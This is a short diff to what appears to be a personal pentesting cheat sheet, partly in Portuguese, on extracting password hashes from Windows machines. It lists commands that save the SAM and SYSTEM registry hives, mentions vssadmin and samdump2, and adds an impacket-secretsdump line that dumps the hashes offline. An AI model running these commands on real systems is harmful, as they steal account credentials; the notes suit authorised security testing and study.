@@ -13,10 +13,15 @@ Windows Server:
 Windows XP:
 C:/Windows/repair
 
-reg save hklm/sam
+reg save hklm\sam new_sam
+reg save hklm\system new_system
+
 vssadmin
 
 [USER]:[ID]:[LM]:[NTLM]
 LM:aad3b435b51404eeaad3b435b51404ee [VAZIO]
 
 Windows Vista ou menor: samdump2
+
+# --==-- #
+impacket-secretsdump -sam [FILE] -system [FILE] LOCAL
